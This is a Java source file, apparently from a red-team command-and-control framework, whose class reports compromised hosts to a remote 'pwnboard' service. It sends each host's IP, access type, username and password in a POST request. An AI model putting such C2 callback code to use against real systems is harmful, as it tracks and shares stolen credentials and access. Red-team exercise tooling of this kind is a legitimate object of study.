package Servers.C2;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;

public class pwnBoardRequest implements Runnable {
    private URI pwnboardUri = null;
    private URL pwnboardUrl = null;
    
    private String pwnboardData;
    private String pwnboardToken;

    public pwnBoardRequest(String IPAddress, String accessType, String username, String password, String pwnboard_api_key) {
        try{
            this.pwnboardUri = new URI("https://pwnboard.win/pwn");
            this.pwnboardUrl = this.pwnboardUri.toURL();
        } catch (URISyntaxException e){
            e.printStackTrace();
        } catch (MalformedURLException e){
            e.printStackTrace();
        }

        String accessInfo = "https://www.javalanche.net" + " | " + "Username: " + username + " Password: " + password;

        pwnboardData  = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"" + accessType + "\", \"access_info\": \"" + accessInfo + "\"}"; 
        pwnboardToken = "Bearer " + pwnboard_api_key;
    }

    @Override
    public void run() {
        try {
            // Connect to pwnboard
            HttpURLConnection pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
            pwnboardConnection.setDoOutput(true);
            pwnboardConnection.setRequestMethod("POST");
            pwnboardConnection.setRequestProperty("Content-Type", "application/json");
            pwnboardConnection.setRequestProperty("Authorization", pwnboardToken);
            pwnboardConnection.connect();

            // Send api request
            DataOutputStream writer = new DataOutputStream(pwnboardConnection.getOutputStream());

            writer.writeBytes(pwnboardData);
            writer.close();

            // Debug lines
            InputStream in = pwnboardConnection.getInputStream();
            Scanner scanner = new Scanner(in);

            while(scanner.hasNext()){
                scanner.nextLine();
            }
            scanner.close();

            pwnboardConnection.disconnect();
        } catch (IOException e){
            System.out.println("when sending " + pwnboardData);
            e.printStackTrace();
        }   
    }
    
}
